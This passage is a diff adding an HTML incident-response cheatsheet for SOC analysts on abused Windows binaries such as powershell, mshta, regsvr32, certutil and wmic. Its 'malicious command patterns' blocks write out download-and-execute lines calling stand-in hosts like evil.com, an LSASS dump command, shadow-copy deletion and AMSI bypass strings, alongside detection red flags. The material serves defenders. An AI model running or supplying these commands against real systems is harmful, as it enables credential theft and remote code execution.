@@ -1,0 +1,1983 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>IR Cheatsheet — Abused Executables | limitlesssec.com</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="assets/css/style.css" />
+  <style>
+    /* ── Page layout ── */
+    .cs-hero {
+      padding: 7rem 2rem 3rem;
+      text-align: center;
+      background: var(--bg-card);
+      border-bottom: 1px solid var(--border);
+    }
+    .cs-hero h1 { font-size: clamp(1.6rem,4vw,2.4rem); color: var(--text); margin-bottom:.5rem; }
+    .cs-hero p  { color: var(--text-muted); max-width:640px; margin:0 auto 1.5rem; font-size:.95rem; }
+    .cs-badge { display:inline-block; background:rgba(0,255,159,.08); border:1px solid var(--accent); color:var(--accent); font-family:var(--font-mono); font-size:.75rem; padding:.25rem .75rem; border-radius:999px; margin:.2rem; }
+
+    /* ── Controls ── */
+    .cs-controls { position:sticky; top:60px; z-index:90; background:var(--bg); border-bottom:1px solid var(--border); padding:.75rem 2rem; display:flex; flex-wrap:wrap; gap:.75rem; align-items:center; }
+    .cs-search { flex:1; min-width:200px; background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:.5rem 1rem; color:var(--text); font-family:var(--font-mono); font-size:.85rem; outline:none; }
+    .cs-search:focus { border-color:var(--accent); }
+    .cs-filters { display:flex; flex-wrap:wrap; gap:.4rem; }
+    .cs-filter { background:transparent; border:1px solid var(--border); color:var(--text-muted); padding:.35rem .85rem; border-radius:999px; font-size:.78rem; cursor:pointer; font-family:var(--font-mono); transition:all .2s; }
+    .cs-filter:hover, .cs-filter.active { border-color:var(--accent); color:var(--accent); background:rgba(0,255,159,.07); }
+    .cs-count { font-family:var(--font-mono); font-size:.78rem; color:var(--text-muted); margin-left:auto; white-space:nowrap; }
+
+    /* ── Grid ── */
+    .cs-grid { max-width:1300px; margin:0 auto; padding:2rem; display:grid; grid-template-columns:repeat(auto-fill,minmax(360px,1fr)); gap:1.25rem; }
+
+    /* ── Tool card ── */
+    .tool-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius-lg); overflow:hidden; transition:border-color .2s, transform .2s; display:flex; flex-direction:column; }
+    .tool-card:hover { border-color:rgba(0,255,159,.35); transform:translateY(-2px); }
+    .tool-card.hidden { display:none; }
+
+    .tool-card__header { padding:1rem 1.25rem .75rem; display:flex; align-items:flex-start; justify-content:space-between; gap:.75rem; border-bottom:1px solid var(--border); }
+    .tool-card__name { font-family:var(--font-mono); font-size:1rem; font-weight:700; color:var(--accent); }
+    .tool-card__cat { font-size:.7rem; font-family:var(--font-mono); padding:.2rem .6rem; border-radius:999px; white-space:nowrap; flex-shrink:0; }
+    .cat--lolbin   { background:rgba(0,255,159,.1);  color:var(--accent); border:1px solid rgba(0,255,159,.3); }
+    .cat--sysint   { background:rgba(99,102,241,.1); color:#818cf8;        border:1px solid rgba(99,102,241,.3); }
+    .cat--offensive{ background:rgba(239,68,68,.1);  color:#f87171;        border:1px solid rgba(239,68,68,.3); }
+    .cat--remote   { background:rgba(251,146,60,.1); color:#fb923c;        border:1px solid rgba(251,146,60,.3); }
+    .cat--exfil    { background:rgba(234,179,8,.1);  color:#facc15;        border:1px solid rgba(234,179,8,.3); }
+
+    .tool-card__body { padding:1rem 1.25rem; flex:1; display:flex; flex-direction:column; gap:.85rem; }
+    .tool-card__what { font-size:.85rem; color:var(--text-muted); font-style:italic; }
+
+    .tool-section__label { font-size:.7rem; font-family:var(--font-mono); text-transform:uppercase; letter-spacing:.08em; color:var(--accent); margin-bottom:.4rem; opacity:.7; }
+    .tool-section ul { margin:0; padding-left:1.1rem; display:flex; flex-direction:column; gap:.25rem; }
+    .tool-section ul li { font-size:.82rem; color:var(--text-muted); line-height:1.5; }
+
+    .tool-card__code { background:rgba(0,0,0,.35); border:1px solid var(--border); border-radius:6px; padding:.6rem .85rem; font-family:var(--font-mono); font-size:.75rem; color:#a5f3c0; margin-top:.3rem; overflow-x:auto; white-space:pre; }
+
+    .tool-card__flags { display:flex; flex-wrap:wrap; gap:.35rem; margin-top:.25rem; }
+    .rflag { background:rgba(239,68,68,.08); border:1px solid rgba(239,68,68,.25); color:#fca5a5; font-family:var(--font-mono); font-size:.7rem; padding:.15rem .5rem; border-radius:4px; }
+
+    .tool-card__footer { padding:.6rem 1.25rem; border-top:1px solid var(--border); display:flex; align-items:center; justify-content:space-between; }
+    .mitre-badge { font-family:var(--font-mono); font-size:.72rem; color:var(--text-muted); }
+    .mitre-badge a { color:#818cf8; text-decoration:none; }
+    .mitre-badge a:hover { color:var(--accent); }
+    .sev { font-size:.68rem; font-family:var(--font-mono); padding:.15rem .5rem; border-radius:999px; }
+    .sev--critical { background:rgba(239,68,68,.12); color:#f87171; border:1px solid rgba(239,68,68,.3); }
+    .sev--high     { background:rgba(251,146,60,.12); color:#fb923c; border:1px solid rgba(251,146,60,.3); }
+    .sev--medium   { background:rgba(234,179,8,.12);  color:#facc15; border:1px solid rgba(234,179,8,.3); }
+
+    /* ── Quick lookup table ── */
+    .ql-section { max-width:1300px; margin:0 auto 4rem; padding:0 2rem; }
+    .ql-section h2 { font-size:1.1rem; color:var(--accent); font-family:var(--font-mono); margin-bottom:1rem; }
+    .ql-table { width:100%; border-collapse:collapse; font-size:.82rem; }
+    .ql-table th { text-align:left; padding:.6rem 1rem; background:var(--bg-card); color:var(--accent); font-family:var(--font-mono); font-size:.75rem; border-bottom:2px solid var(--border); }
+    .ql-table td { padding:.55rem 1rem; border-bottom:1px solid var(--border); color:var(--text-muted); font-family:var(--font-mono); }
+    .ql-table td:first-child { color:var(--accent); white-space:nowrap; }
+    .ql-table tr:hover td { background:rgba(0,255,159,.03); }
+
+    /* ── No results ── */
+    .cs-empty { display:none; text-align:center; padding:4rem 2rem; color:var(--text-muted); font-family:var(--font-mono); grid-column:1/-1; }
+    .cs-empty.show { display:block; }
+
+    @media(max-width:768px) {
+      .cs-grid { grid-template-columns:1fr; padding:1rem; }
+      .cs-controls { flex-direction:column; align-items:flex-start; }
+    }
+  </style>
+</head>
+<body>
+
+  <nav class="nav" id="nav">
+    <div class="nav__inner">
+      <a href="index.html" class="nav__logo">&gt; limitlesssec.com</a>
+      <ul class="nav__links">
+        <li><a href="index.html#about">About</a></li>
+        <li><a href="index.html#skills">Skills</a></li>
+        <li><a href="index.html#experience">Experience</a></li>
+        <li><a href="index.html#contact">Contact</a></li>
+        <li><a href="lolbins.html" class="nav__cta">IR Cheatsheet</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <div class="cs-hero">
+    <h1><span class="accent">&gt;</span> IR Cheatsheet — Abused Executables</h1>
+    <p>Reference guide for SOC analysts and incident responders. Covers Windows LOLBins, offensive frameworks, remote access tools, and exfiltration utilities commonly abused by threat actors.</p>
+    <span class="cs-badge">Windows LOLBins</span>
+    <span class="cs-badge">Offensive Frameworks</span>
+    <span class="cs-badge">Remote Access / RMM</span>
+    <span class="cs-badge">Exfiltration Tools</span>
+    <span class="cs-badge">MITRE ATT&amp;CK Mapped</span>
+  </div>
+
+  <div class="cs-controls">
+    <input class="cs-search" type="text" id="csSearch" placeholder="Search tools... (e.g. lsass, rundll32, exfil)" autocomplete="off" />
+    <div class="cs-filters">
+      <button class="cs-filter active" data-cat="all">All</button>
+      <button class="cs-filter" data-cat="lolbin">LOLBins</button>
+      <button class="cs-filter" data-cat="sysint">Sysinternals</button>
+      <button class="cs-filter" data-cat="offensive">Offensive</button>
+      <button class="cs-filter" data-cat="remote">Remote Access</button>
+      <button class="cs-filter" data-cat="exfil">Exfiltration</button>
+    </div>
+    <span class="cs-count" id="csCount"></span>
+  </div>
+
+  <div class="cs-grid" id="csGrid">
+    <div class="cs-empty" id="csEmpty">No tools match your search.</div>
+
+    <!-- ══════════════════════════════════════════
+         LOLBINs
+    ══════════════════════════════════════════ -->
+
+    <div class="tool-card" data-cat="lolbin" data-tags="powershell ps1 encoded amsi fileless mimikatz empire cobalt strike download cradle iex webClient">
+      <div class="tool-card__header">
+        <span class="tool-card__name">powershell.exe / pwsh.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Windows scripting engine and automation framework — full attack lifecycle platform.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>-EncodedCommand hides base64 payloads — most common obfuscation primitive</li>
+            <li>IEX + DownloadString = fileless in-memory execution, nothing touches disk</li>
+            <li>AMSI bypass via reflection patching (amsiInitFailed / AmsiScanBuffer patch)</li>
+            <li>-Version 2 downgrade bypasses AMSI entirely — v2 predates it</li>
+            <li>Runs PowerSploit, PowerView, Invoke-Mimikatz via download cradles</li>
+            <li>Disables Defender: Set-MpPreference -DisableRealtimeMonitoring $true</li>
+            <li>Loads .NET assemblies in memory: [Reflection.Assembly]::Load — Cobalt Strike / Empire beacon delivery</li>
+            <li>Registry-stored payloads: reads Base64 from reg key → IEX — no .ps1 file ever written</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">powershell.exe -NoP -NonI -W Hidden -Enc &lt;LONG_BASE64&gt;
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://...')"
+powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -EncodedCommand &lt;B64&gt;
+powershell -Version 2 -Command "malicious code"   # AMSI bypass via downgrade
+IEX (iwr 'http://attacker.com/p.ps1' -UseBasicParsing).Content
+[Reflection.Assembly]::Load([System.Convert]::FromBase64String('&lt;BASE64_ASSEMBLY&gt;'))</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Suspicious parent → powershell chains</div>
+          <div class="tool-card__code">winword.exe / excel.exe / outlook.exe → powershell   # macro exploitation
+mshta.exe → powershell                                # HTA stage
+wscript.exe / cscript.exe → powershell               # VBS dropper
+wmiprvse.exe → powershell                             # WMI lateral movement
+chrome.exe / msedge.exe → powershell                 # ClickFix / ClearFake
+svchost.exe → powershell                              # suspicious service</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">AMSI bypass strings (look in Event ID 4104)</div>
+          <div class="tool-card__code">amsiInitFailed     AmsiUtils     AmsiScanBuffer
+VirtualProtect     Marshal::Copy     amsi.dll
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">-enc with payload &gt;200 chars</span>
+            <span class="rflag">-ExecutionPolicy Bypass + -W Hidden + -NonI + -NoP combo</span>
+            <span class="rflag">IEX + DownloadString in same command</span>
+            <span class="rflag">[Reflection.Assembly]::Load + Base64 blob</span>
+            <span class="rflag">Parent: winword / excel / mshta / wmiprvse</span>
+            <span class="rflag">-Version 2 flag (AMSI downgrade)</span>
+            <span class="rflag">amsiInitFailed in Event 4104</span>
+            <span class="rflag">Outbound connection right after launch</span>
+            <span class="rflag">Running from %TEMP% or unusual path</span>
+            <span class="rflag">Accessing lsass.exe (Sysmon EID 10)</span>
+            <span class="rflag">ConsoleHost_history.txt cleared</span>
+            <span class="rflag">Rapid multiple PS processes (worm/automated)</span>
+          </div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Key event IDs</div>
+          <ul>
+            <li><strong>4104</strong> — Script Block Logging: deobfuscated content at execution (CRITICAL — enable this)</li>
+            <li><strong>4103</strong> — Module Logging: pipeline details, variable values</li>
+            <li><strong>Sysmon 1</strong> — Full command line + parent + hash</li>
+            <li><strong>Sysmon 3</strong> — Network connection from powershell.exe</li>
+            <li><strong>Sysmon 10</strong> — lsass.exe access = credential dump</li>
+            <li><strong>4698/4702</strong> — Scheduled task created/modified via PS</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Forensic artifacts</div>
+          <ul>
+            <li>ConsoleHost_history.txt — %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ (not cleared by Clear-History)</li>
+            <li>Event 4104 logs — deobfuscated script blocks persist even after script deleted</li>
+            <li>Prefetch — POWERSHELL.EXE-{HASH}.pf</li>
+            <li>SRUM DB — bytes sent by powershell.exe (exfil quantification)</li>
+            <li>Memory — Volatility can extract PS script blocks from RAM (fileless)</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Known threat actors</div>
+          <ul>
+            <li>APT28, APT29, APT32, APT41, Sandworm, HAFNIUM</li>
+            <li>FIN7, Wizard Spider, Cobalt Group</li>
+            <li>Black Basta, Akira, LockBit, Emotet, TrickBot, QakBot</li>
+            <li>Lumma Stealer, CoralRaider (ClickFix/ClearFake chains)</li>
+          </ul>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank">T1059.001</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="cmd command relay recon macro">
+      <div class="tool-card__header">
+        <span class="tool-card__name">cmd.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Windows command interpreter.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Office macro → cmd → PowerShell/wscript relay</li>
+            <li>Executes recon commands: net, whoami, systeminfo</li>
+            <li>Chained with LOLBins for multi-stage execution</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">Parent: winword / excel / outlook</span>
+            <span class="rflag">Spawning powershell / mshta / rundll32</span>
+            <span class="rflag">Running from %TEMP% / %APPDATA%</span>
+            <span class="rflag">&amp;&amp; chained recon commands</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1059/003/" target="_blank">T1059.003</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="rundll32 dll lsass comsvcs minidump shellcode">
+      <div class="tool-card__header">
+        <span class="tool-card__name">rundll32.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Runs exported functions from DLL files.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Loads malicious DLLs from disk or UNC paths</li>
+            <li>LSASS dump via comsvcs.dll MiniDump</li>
+            <li>Proxy for shellcode without writing a PE</li>
+            <li>Bypasses AppWhitelisting (signed MS binary)</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">rundll32 comsvcs.dll MiniDump &lt;pid&gt; dump.bin full
+rundll32 \\attacker\share\evil.dll,EntryPoint
+rundll32 javascript:"..\\mshtml,RunHTMLApplication"</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">comsvcs.dll + MiniDump = LSASS dump</span>
+            <span class="rflag">UNC path (\\) in args</span>
+            <span class="rflag">DLL from %TEMP% / %APPDATA%</span>
+            <span class="rflag">No DLL argument (shellcode host)</span>
+            <span class="rflag">Network connections from process</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/011/" target="_blank">T1218.011</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="mshta hta vbscript jscript macro phishing clickfix clearfake apt29 fin7 gamaredon muddywater">
+      <div class="tool-card__header">
+        <span class="tool-card__name">mshta.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Microsoft HTML Application Host — executes .hta files using Trident engine. Ranked #2 in Red Canary's 2024 threat detection report — surged due to ClearFake/ClickFix campaigns.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Executes remote HTA files with VBScript/JScript — bypasses AppLocker (signed MS binary)</li>
+            <li>Spawned by Office macros to proxy execution and avoid direct PowerShell detection</li>
+            <li>ClearFake/ClickFix (2024): fake CAPTCHA on compromised site copies mshta command to clipboard → user pastes into Win+R Run dialog → no email, no file, no AV scan</li>
+            <li>Inline vbscript: moniker — runs PowerShell entirely in-line, nothing touches disk</li>
+            <li>WMI-broken chain evasion: malware uses WMI to spawn processes from mshta.exe making wmiprvse.exe appear as parent, breaking parent-child detection rules</li>
+            <li>Registry-embedded payload execution via vbscript: → RegRead → Execute</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">mshta.exe http://attacker.com/payload.hta
+mshta.exe https://185.220.x.x/stage2.hta
+
+# Inline VBScript — runs PS without touching disk
+mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""powershell -ExecutionPolicy Bypass -W Hidden -File C:\Users\Public\s.ps1"",0"))
+
+# Inline scriptlet from remote SCT file
+mshta.exe vbscript:Close(Execute("GetObject(""script:https://attacker.com/p.sct"")"))
+
+# ClearFake/ClickFix pattern (2024 surge)
+mshta xxxx[.]co/xxxxxx=+\xxx
+
+# HTA from user-writable path (post-phishing)
+mshta.exe C:\Users\Public\Downloads\invoice.hta</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Suspicious parent → mshta chains</div>
+          <div class="tool-card__code">winword.exe / excel.exe / outlook.exe → mshta   # macro exploitation
+wscript.exe / cscript.exe → mshta               # VBS dropper
+explorer.exe → mshta                             # ClickFix / Run dialog lure
+chrome.exe / msedge.exe → mshta                 # malvertising / drive-by</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Suspicious mshta → child chains</div>
+          <div class="tool-card__code">mshta → powershell    mshta → cmd         mshta → wscript
+mshta → rundll32      mshta → certutil    mshta → regsvr32
+mshta → bitsadmin     mshta → schtasks    mshta → reg.exe</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">URL / HTTP in arguments</span>
+            <span class="rflag">vbscript: or javascript: moniker</span>
+            <span class="rflag">Parent: winword / excel / outlook / browser</span>
+            <span class="rflag">Spawning powershell / cmd / wscript</span>
+            <span class="rflag">Outbound connection (Sysmon EID 3)</span>
+            <span class="rflag">.hta file in %TEMP% / %APPDATA% / Downloads</span>
+            <span class="rflag">Renamed mshta.exe — check OriginalFileName (Sysmon EID 1)</span>
+            <span class="rflag">scrobj.dll / jscript.dll / vbscript.dll loaded (Sysmon EID 7)</span>
+            <span class="rflag">Explorer parent = ClickFix / Run dialog lure</span>
+            <span class="rflag">Touching Run/RunOnce keys (Sysmon EID 13)</span>
+            <span class="rflag">Creating files in temp directories (Sysmon EID 11)</span>
+            <span class="rflag">Base64 strings or obfuscated chars in command line</span>
+            <span class="rflag">User report of website asking to open Run and paste a command</span>
+          </div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Key event IDs</div>
+          <ul>
+            <li><strong>Sysmon 1</strong> — Full command line, parent, OriginalFileName (catches renamed binary)</li>
+            <li><strong>Sysmon 3</strong> — Network connection from mshta.exe</li>
+            <li><strong>Sysmon 7</strong> — DLL load: jscript.dll / vbscript.dll / scrobj.dll in mshta</li>
+            <li><strong>Sysmon 11</strong> — File created by mshta.exe</li>
+            <li><strong>Sysmon 13</strong> — Registry set — mshta touching Run keys</li>
+            <li><strong>Sysmon 22</strong> — DNS query from mshta.exe</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Forensic artifacts</div>
+          <ul>
+            <li>.hta files in %TEMP%, %APPDATA%, Downloads, Desktop</li>
+            <li>Prefetch — MSHTA.EXE-{HASH}.pf (proves execution + files accessed)</li>
+            <li>AmCache — first execution timestamp</li>
+            <li>Browser history / download logs if .hta was downloaded</li>
+            <li>Registry Run/RunOnce keys if persistence was set</li>
+            <li>Scheduled task XML in C:\Windows\System32\Tasks\</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Known threat actors</div>
+          <ul>
+            <li>APT29, APT32, APT36, APT38, APT41, Kimsuky, Lazarus</li>
+            <li>FIN7, Gamaredon, MuddyWater, TA551</li>
+            <li>Lumma Stealer, AsyncRAT, XWorm, NetSupport RAT (ClearFake chain)</li>
+            <li>Koadic C2, Covenant C2 (HTA-based stagers)</li>
+          </ul>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/005/" target="_blank">T1218.005</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="wscript cscript vbs js vbscript trickbot qakbot emotet">
+      <div class="tool-card__header">
+        <span class="tool-card__name">wscript.exe / cscript.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Windows Script Host — runs .vbs, .js, .wsf scripts.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Spawned by Office macros as dropper</li>
+            <li>Executes obfuscated scripts from %TEMP%</li>
+            <li>Used by TrickBot, Qakbot, Emotet loader chains</li>
+            <li>cscript.exe runs silently in console mode</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">Parent: winword / excel / outlook</span>
+            <span class="rflag">Scripts in %TEMP% / %APPDATA%</span>
+            <span class="rflag">Random script names (aB3x.vbs)</span>
+            <span class="rflag">//e:jscript or //e:vbscript flags</span>
+            <span class="rflag">//B silent mode</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1059/005/" target="_blank">T1059.005</a> / <a href="https://attack.mitre.org/techniques/T1059/007/" target="_blank">T1059.007</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="regsvr32 squiblydoo sct applocker bypass scrobj">
+      <div class="tool-card__header">
+        <span class="tool-card__name">regsvr32.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Registers/unregisters COM DLLs and ActiveX controls.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>"Squiblydoo" — executes remote SCT scriptlet files</li>
+            <li>Bypasses AppLocker completely (signed MS binary)</li>
+            <li>SCT files contain JScript/VBScript payloads</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">regsvr32 /s /n /u /i:http://evil.com/p.sct scrobj.dll
+regsvr32 /s /u /i:\\attacker\share\p.sct scrobj.dll</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">URL in arguments</span>
+            <span class="rflag">scrobj.dll present</span>
+            <span class="rflag">/i: with remote path</span>
+            <span class="rflag">Outbound HTTP from regsvr32</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/010/" target="_blank">T1218.010</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="msiexec installer msi lazarus ta505 remote download">
+      <div class="tool-card__header">
+        <span class="tool-card__name">msiexec.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Windows Installer — installs MSI packages.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Downloads and executes remote MSI packages</li>
+            <li>/q flag suppresses UI silently</li>
+            <li>Embedded custom actions run arbitrary code</li>
+            <li>Abused by Lazarus, TA505</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">msiexec /q /i http://evil.com/payload.msi
+msiexec /q /i \\attacker\share\payload.msi</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">URL in /i argument</span>
+            <span class="rflag">/q with unusual package path</span>
+            <span class="rflag">MSI from %TEMP% / Public</span>
+            <span class="rflag">Unexpected child processes</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/007/" target="_blank">T1218.007</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="msbuild dotnet csproj apt29 applocker bypass inline">
+      <div class="tool-card__header">
+        <span class="tool-card__name">msbuild.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Microsoft Build Engine — compiles .NET/Visual Studio projects.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Compiles inline C# from .csproj/.xml — no binary needed</li>
+            <li>Bypasses AppLocker (trusted signed binary)</li>
+            <li>Used by APT29, Cobalt Strike loaders</li>
+            <li>Shellcode embedded as base64 in XML</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">msbuild.exe C:\Users\Public\payload.csproj
+msbuild.exe %TEMP%\build.xml</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">Outside Visual Studio path</span>
+            <span class="rflag">.csproj in %TEMP% / Public</span>
+            <span class="rflag">Non-developer user</span>
+            <span class="rflag">Network connections from process</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1127/001/" target="_blank">T1127.001</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="wmic xsl lateral movement remote process wmi subscription">
+      <div class="tool-card__header">
+        <span class="tool-card__name">wmic.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">WMI command-line interface (deprecated in Win11 but still functional).</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Remote process creation on other hosts (/node:)</li>
+            <li>XSL execution: /format:http://evil.com/payload.xsl</li>
+            <li>Lateral movement without touching disk on remote</li>
+            <li>WMI event subscriptions for persistence</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">wmic /node:TARGET process call create "cmd.exe /c ..."
+wmic os get /format:http://evil.com/evil.xsl
+wmic shadowcopy delete</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">/node: with remote IP</span>
+            <span class="rflag">/format: with URL</span>
+            <span class="rflag">process call create</span>
+            <span class="rflag">shadowcopy delete</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1047/" target="_blank">T1047</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="certutil download urlcache base64 decode volt typhoon">
+      <div class="tool-card__header">
+        <span class="tool-card__name">certutil.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Certificate utility for PKI management.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Downloads files: certutil -urlcache -split -f &lt;URL&gt;</li>
+            <li>Encodes/decodes Base64 to obfuscate payloads</li>
+            <li>Used by Volt Typhoon for payload staging</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">certutil -urlcache -split -f http://evil.com/p.exe p.exe
+certutil -decode encoded.txt payload.exe</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">-urlcache with HTTP URL</span>
+            <span class="rflag">-decode on %TEMP% files</span>
+            <span class="rflag">Output .exe / .dll / .ps1</span>
+            <span class="rflag">Non-PKI admin running it</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1105/" target="_blank">T1105</a> / <a href="https://attack.mitre.org/techniques/T1027/" target="_blank">T1027</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
